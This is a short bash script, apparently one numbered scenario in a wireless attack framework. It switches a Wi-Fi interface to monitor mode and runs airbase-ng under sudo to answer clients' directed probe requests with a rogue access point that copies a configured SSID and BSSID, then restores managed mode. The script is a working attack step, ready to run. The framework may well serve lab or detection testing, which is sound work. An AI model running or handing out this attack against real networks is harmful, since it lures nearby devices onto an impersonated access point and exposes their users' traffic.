#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SERVICES_DIR="$BASH_DIR/services"
SCENARIO_DIR="$BASH_DIR/scenarios"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t016.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# ─── Run Attack ───
ensure_monitor_mode

print_blank
print_info "Running T016 - Directed Probe Response attack for $T016_DURATION seconds"

sudo timeout "$T016_DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"

EXIT_CODE=$?

ensure_managed_mode

if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "airbase-ng exited with code $EXIT_CODE"
fi

exit 0